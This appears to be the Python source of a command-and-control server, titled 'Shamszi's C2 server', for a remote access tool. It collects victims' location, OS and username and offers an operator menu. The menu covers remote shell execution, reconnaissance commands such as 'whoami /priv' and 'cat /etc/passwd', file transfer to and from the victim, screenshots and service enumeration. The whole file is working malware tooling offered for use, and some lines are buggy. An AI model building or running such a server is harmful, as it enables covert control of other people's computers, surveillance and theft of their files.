import socket
import os
import sys
import time
import threading
import pyfiglet
from colorama import Fore, Style
from cryptography.fernet import Fernet
import termcolor
import signal
import shutil
import platform
import datetime
import subprocess

def signal_handler(sig,frame):
    print(Fore.RED+'\nCTRL^C detected by server..'+Style.RESET_ALL)
    try:
        sys.exit()
    except SystemExit:
        pass
signal.signal(signal.SIGINT,signal_handler)

def generate_key():
    key = b'pVYWs5nkSVKW8Lr4oTCh635uMBLeqvEpLHL5lW4UH5g='
    cipher = Fernet(key=key)
    print(cipher)

def main():
    now = datetime.datetime.now()
    year = now.strftime("%Y-%m-%d")
    clock = now.strftime("%H:%M:%S")

    title_text = "      Shamszi's C2 server"
    title_output = pyfiglet.figlet_format(text=title_text)
    print(termcolor.colored(title_output, 'red', attrs=['bold']))

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0",7777))
    server.listen(3)
    print('[+] Waiting for connection [+]')
    time.sleep(2)
    
    while True:
        conn, addr = server.accept()
        print(Fore.LIGHTGREEN_EX+'[' + year + ' ' + clock + '] ' + 'Connection received from', addr[0]+Style.RESET_ALL)

        print('#' * 119+'\n')
        
        city = conn.recv(8192).decode('UTF-8')
        geolocation = conn.recv(4096).decode('UTF-8')
        os_type = conn.recv(8192).decode('UTF-8')
    
        print(Fore.CYAN +"\t\t\t   City:" + city+ " <----------------> " + "Geolocation:"+geolocation+Style.RESET_ALL)
        print(Fore.RED+os_type+Style.RESET_ALL)

        user = conn.recv(1024).decode('UTF-8')
        print(Fore.RED + user +Style.RESET_ALL)

        my_os = platform.system().lower()
        text = '''\t\t  [+] A) Execute a command [+]
                  [+] B) System Information [+] 
                  [+] C) Download a file from server [+]
                  [+] D) Upload a file [+]
                  [+] E) Take a screenshot from client [+]
                  [+] F) Running Services in target [+]
                  [+] Please write quit or exit for stop the server [+]\n'''
        
        try:
            while True:
                print(Fore.BLUE + text + Style.RESET_ALL)
                option = input("Please enter a option:")
        
                if option.lower() == 'a':
                    while True:
                        data = input('Shell>> ')
                        if data == 'exit':  
                            break

                        if data == 'cd ':
                            conn.send('cd'.encode('UTF-8'))
                            cwd = conn.recv(4096).decode('UTF-8')
                            print(cwd)
                            continue

                        if data == 'cd ../':
                            conn.send('cd ../'.encode('UTF-8'))
                            cwd = conn.recv(4096).decode('UTF-8')
                            print(cwd)
                            continue

                        if 'linux' in os_type:
                            if data == 'cd ~':
                                conn.send('cd ~'.strip())
                                resp = conn.recv()
                                print(resp)
                                continue

                        if not data:
                            continue
        
                        conn.send(data.encode())
                        resp = conn.recv(50000000).decode()
                        if resp:
                            print(resp)
                            continue
                            
                        if not resp:
                            continue

                elif option.lower() == 'b':
                    if 'windows' in os_type.lower():
                        information = ['whoami', 'net user', 'whoami /priv', 'net localgroup', 'ipconfig | findstr IPv4', 'systeminfo', 'qwinsta']
                        for info in information:
                            conn.send(info.encode('UTF-8'))
                            resp = conn.recv(49152).decode('UTF-8')
                            print(resp)

                    elif 'linux' in os_type.lower() or 'darwin' in os_type.lower():
                        information = [r'echo "$(hostname)\\$(whoami)"', 'id', 'ifconfig', 'cat /etc/passwd', 'uname -a','who']
                        for info in information:
                            conn.send(info.encode('UTF-8'))
                            resp = conn.recv(491520).decode('UTF-8')
                            print(resp)
                        
                    else:
                        print("Please try it manually..((")
                        continue

                elif option.lower() == 'c':
                    file_name = input("Please enter the file name for upload: ")
                    if not file_name:
                        continue
                    if os.path.isfile(file_name):
                        conn.send("download"+file_name.encode('UTF-8'))
                        data = conn.recv(49152)
                        with open(file_name,'wb') as f:
                            f.write(data)
                        print(f"{file_name} downloaded successfully.")
                        

                    with open(file_name, 'rb') as file:
                        file_data = file.read(1024)
                        while file_data:
                            conn.send(file_data)
                            file_data = file.read(1024)
                        conn.send(b"EOF")
                        print("File sent successfully")
                    
                elif option.lower() == 'd':
                    file_name = input("Please enter the file name for transfer: ")
                    if not file_name:
                        continue
                    conn.send(file_name.encode('UTF-8'))

                    with open(file_name, 'wb') as file:
                        while True:
                            file_data = conn.recv(1024)
                            if file_data.endswith(b"EOF"):
                                file.write(file_data[:-3])
                                print("File received successfully")
                                break
                            file.write(file_data)
                            
                elif option.lower() == 'e':
                    conn.send('screenshot'.encode('UTF-8'))
                    screenshot = conn.recv(65887600)
                    with open('screenshot.png','wb') as f:
                        f.write(screenshot)
                        time.sleep(2)
                        f.close()
                        if my_os == 'windows':
                            try:
                                userprofile = os.getenv('USERPROFILE')
                                pwd = os.getcwd()
                                shutil.copyfile(src=os.path.join(pwd,'screenshot.png'), dst=os.path.join(userprofile, 'Desktop', 'screenshot.png'))
                                os.system('start screenshot.png')
                                print(Fore.YELLOW+"[+] Screenshot saved your desktop [+]\n"+Style.RESET_ALL)

                            except FileExistsError:
                                print("In your directory have a same named file..")
                                pass

                        elif my_os == 'linux':
                            try:
                                home_directory = os.getenv('HOME')
                                pwd = os.getcwd()
                                shutil.copy2(src=os.path.join(pwd,'screenshot1.png'),dst=os.path.join(home_directory,'Desktop','screenshot1.png'))
                                os.system('xdg-open screenshot1.png')
                                print(Fore.YELLOW+"[+] Screenshot saved your Desktop [+]\n"+Style.RESET_ALL)
                            except FileExistsError:
                                print("In your directory have a same named file..")
                                pass

                        elif my_os == 'darwin':
                            try:
                                home_directory = os.getenv('HOME')
                                pwd = os.getcwd()
                                shutil.copy2(src=os.path.join(pwd, 'screenshot1.png'), dst=os.path.join(home_directory, 'Desktop', 'screenshot1.png'))
                                os.system('open screenshot1.png')
                                print(Fore.YELLOW+"[+] Screenshot saved to your Desktop [+]\n"+Style.RESET_ALL)

                            except FileExistsError:
                                print("A file with the same name already exists in your directory.")
                                pass

                        else:
                            print("Operating system not detected for screenshot")
                            continue

                elif option.lower() == 'f':
                    conn.send("service_enum".encode('UTF-8'))
                    response1 = conn.recv(90000000).decode('UTF-8')
                    response2 = conn.recv(90000000).decode('UTF-8')
                    print(response1)
                    print(response2)
                    continue

                elif 'quit' in option or 'exit' in option:
                    stop = "[-] Server stoppped! [-]\n"
                    print(Fore.RED+stop+Style.RESET_ALL)
                    conn.close()
                    server.close()
                    sys.exit()

                else:
                    print("Invalid option!")
                    continue

        except ConnectionRefusedError:
            print(Fore.RED + 'Connection refused by user...'+ Style.RESET_ALL)
            sys.exit()
    
        except ConnectionAbortedError:
            print(Fore.RED + "Command Error!" +Style.RESET_ALL)
            sys.exit()

        except Exception as e:
            print(Fore.RED+'[-] Have an error: {} ! [-]\n'.format(e)+Style.RESET_ALL)
            sys.exit()
            
if __name__ == "__main__":
    main()

